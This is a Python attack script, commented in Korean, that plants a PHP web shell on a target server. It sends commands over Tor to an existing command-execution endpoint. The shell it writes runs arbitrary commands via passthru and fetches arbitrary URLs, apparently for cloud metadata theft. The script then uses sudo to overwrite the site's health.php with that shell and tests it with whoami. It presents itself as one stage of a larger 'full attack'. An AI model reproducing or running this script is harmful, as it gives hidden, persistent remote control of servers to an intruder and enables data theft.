#!/usr/bin/env python3
"""
간단한 방법: echo로 여러 줄 웹쉘 업로드
"""

import requests
import sys
import time

def upload_simple_webshell(target_ip):
    print(f"[*] 간단한 웹쉘 업로드")
    print(f"[*] Target: {target_ip}")

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    upload_url = f"http://{target_ip}/api/health.php"

    # 웹쉘을 heredoc으로 작성
    commands = [
        # 1. 새 웹쉘 작성
        """cat > /tmp/newshell.php << 'EOFPHP'
<?php
header('Content-Type: text/plain');
if (isset($_GET['cmd'])) {
    echo "=== START ===\\n";
    passthru($_GET['cmd'] . " 2>&1");
    echo "\\n=== END ===\\n";
} elseif (isset($_GET['check']) && $_GET['check'] === 'metadata' && isset($_GET['url'])) {
    $url = $_GET['url'];
    echo @file_get_contents($url);
} else {
    echo "OK\\n";
}
?>
EOFPHP""",
        # 2. 복사
        "sudo cp /tmp/newshell.php /var/www/html/www/api/health.php",
        "sudo chown apache:apache /var/www/html/www/api/health.php",
        "sudo chmod 644 /var/www/html/www/api/health.php",
        # 3. 확인
        "ls -la /var/www/html/www/api/health.php"
    ]

    try:
        for i, cmd in enumerate(commands, 1):
            print(f"\n[{i}/{len(commands)}] 실행 중...")
            params = {'cmd': cmd}
            resp = session.get(upload_url, params=params, timeout=30)
            print(f"    Status: {resp.status_code}")

            if i == len(commands):  # 마지막 ls 명령
                if 'health.php' in resp.text:
                    print(f"[+] 파일 확인됨!")

        # 테스트
        print(f"\n[*] 새 웹쉘 테스트 중...")
        time.sleep(1)

        # 캐시 우회를 위해 타임스탬프 추가
        test_url = f"{upload_url}?t={int(time.time())}&cmd=whoami"
        resp = session.get(test_url, timeout=15)

        print(f"    Raw response:")
        print(f"    {resp.text[:200]}")

        if "=== START ===" in resp.text:
            output = resp.text.split("=== START ===")[1].split("=== END ===")[0].strip()
            print(f"\n[+] ✅ 웹쉘 작동 확인!")
            print(f"    whoami output: {output}")
            return True
        elif resp.text.strip():
            print(f"\n[+] 웹쉘 응답 있음 (다른 형식)")
            print(f"    Response: {resp.text.strip()}")
            return True
        else:
            print(f"\n[-] 웹쉘 응답 없음")
            return False

    except Exception as e:
        print(f"[-] 에러: {e}")
        import traceback
        traceback.print_exc()
        return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    if upload_simple_webshell(target_ip):
        print(f"\n[+] 성공! 이제 136_tor_full_attack.py 실행 가능")
    else:
        print(f"\n[-] 실패")
